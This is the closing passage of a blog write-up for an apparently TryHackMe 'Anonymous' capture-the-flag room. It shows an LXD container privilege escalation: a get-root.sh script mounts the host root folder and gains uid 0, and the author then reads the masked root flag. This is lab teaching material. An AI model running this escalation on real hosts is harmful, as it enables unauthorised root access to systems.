</pre></table></code></div></div><p>When this steps are done we can now run the script on the target:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>namelessone@anonymous:~<span class="nv">$ </span>./get-root.sh <span class="nt">-f</span> alpine-v3.12-x86_64-20200927_2146.tar.gz
&lt;root.sh <span class="nt">-f</span> alpine-v3.12-x86_64-20200927_2146.tar.gz
Image imported with fingerprint: e35751259917ef3b79e8aac7a30a93178e6da525f5b4cf76bef49452d5d09997
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | e35751259917 | no     | alpine v3.12 <span class="o">(</span>20200927_21:46<span class="o">)</span> | x86_64 | 3.05MB | Sep 27, 2020 at 8:40pm <span class="o">(</span>UTC<span class="o">)</span> |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
</pre></table></code></div></div><p>Let’s check if we are root with the command “id”:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></table></code></div></div><p>In this Vulnerability. The Exploit is loading a Container and is mounting the /root folder to the mounting path “/mnt/root/”.</p><p>In this path we can now check the root-flag of the target.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /mnt/root/root
<span class="nb">pwd</span>
/mnt/root/root
<span class="nb">ls
</span>root.txt
<span class="nb">cat </span>root.txt
4<span class="k">******************************</span>3
</pre></table></code></div></div><p>Now we have the root-flag and we have pwned the machine.</p><h1 id="summary">Summary:</h1><p>This room was interessting, because of the change of the script witch is running on the target for getting a reverse shell.</p><p>When i got the first shell on the target, the Priv-Escalation was straight forward. With LXD it was no new stuff.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hacking/'>Hacking</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackeme/" class="post-tag no-text-decoration" >TryHackeMe</a> <a href="/tags/anonymous/" class="post-tag no-text-decoration" >Anonymous</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >Hacking</a> <a href="/tags/pwned/" class="post-tag no-text-decoration" >pwned</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Writeup - Anonymous - Fr3akazo1d!&url=protocol://domain/posts/thm-Anonymous-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Writeup - Anonymous - Fr3akazo1d!&u=protocol://domain/posts/thm-Anonymous-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Writeup - Anonymous - Fr3akazo1d!&url=protocol://domain/posts/thm-Anonymous-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/pwned/">pwned</a> <a class="post-tag" href="/tags/hacking/">Hacking</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/security/">Security</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/THM-Anthem-Writeup/"><div class="card-body"> <span class="timeago small" > Oct 3 <i class="unloaded">2020-10-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Anthem</h3><div class="text-muted small"><p> Difficulty: Easy TryHackMe-Tags: Windows, CMS, enumeration, Weekly Challange This Room is about a Web-Server where we have to find different flags, usernames and possible Passwords on the Web-Ser...</p></div></div></a></div><div class="card"> <a href="/posts/THM-Brooklyn-NineNine-Writeup/"><div class="card-body"> <span class="timeago small" > Oct 6 <i class="unloaded">2020-10-06T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Brooklyn- NineNine</h3><div class="text-muted small"><p> Global Information Difficulty: Easy Open-Ports: 21 22 80 Vulnerability Ports: 21 Used-Programs: NMAP Gobuster ssh Used Websites: GTFOBins TryhackMe Tags: secu...</p></div></div></a></div><div class="card"> <a href="/posts/THM-EasyPeasy-Writeup/"><div class="card-body"> <span class="timeago small" > Oct 12 <i class="unloaded">2020-10-12T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup - Easy-Peasy</h3><div class="text-muted small"><p> Walkthrough Used gobuster gobuster dir -u http://10.10.201.81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt tee gobuster-output.txt ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/thm-Bounty-Hacker-Writeup/" class="btn btn-outline-primary"><p>TryhackMe - BountyHacker</p></a> <a href="/posts/THM-Anthem-Writeup/" class="btn btn-outline-primary"><p>Writeup - Anthem</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com">Fr3akazo1d!</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> The quieter you become the more you are able to hear!</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/pwned/">pwned</a> <a class="post-tag" href="/tags/hacking/">Hacking</a> <a class="post-tag" href="/tags/tryhackeme/">TryHackeMe</a> <a class="post-tag" href="/tags/cronjob/">cronjob</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/security/">Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="protocol://domain{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
